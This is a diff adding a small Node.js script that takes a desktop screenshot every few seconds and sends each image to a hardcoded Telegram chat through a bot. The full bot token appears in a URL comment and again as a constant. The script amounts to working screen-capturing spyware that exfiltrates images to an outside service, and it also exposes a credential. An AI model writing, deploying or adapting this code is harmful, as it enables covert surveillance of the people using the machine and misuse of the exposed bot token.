@@ -1,0 +1,31 @@
+//https://api.telegram.org/bot863878594:AAE95kZdNGyn1CVzdETsj0Gt0dl37JdMCfI/getUpdates
+
+var temporal = require('temporal');
+var screenshot = require('desktop-screenshot');
+const Telegram = require('telegraf/telegram');
+
+const CHAT_ID = '-488004429';
+const token = '863878594:AAE95kZdNGyn1CVzdETsj0Gt0dl37JdMCfI';
+const telegram = new Telegram(token);
+ enviar();
+
+function enviar(){
+temporal.loop(7000,function(){
+  temporal.delay(3000,function(){print()})
+  
+
+  }
+);
+}
+function print(){
+
+  screenshot("screenshot.png", function(error, complete) {
+      if(error)
+        console.log("Screenshot failed", error);
+      else
+        console.log("Screenshot succeeded");
+        telegram.sendDocument(CHAT_ID,{source:'C:\\Users\\tr642633\\Documents\\desenvolvimento\\node\\screenshot.png'});
+  });
+  
+
+}
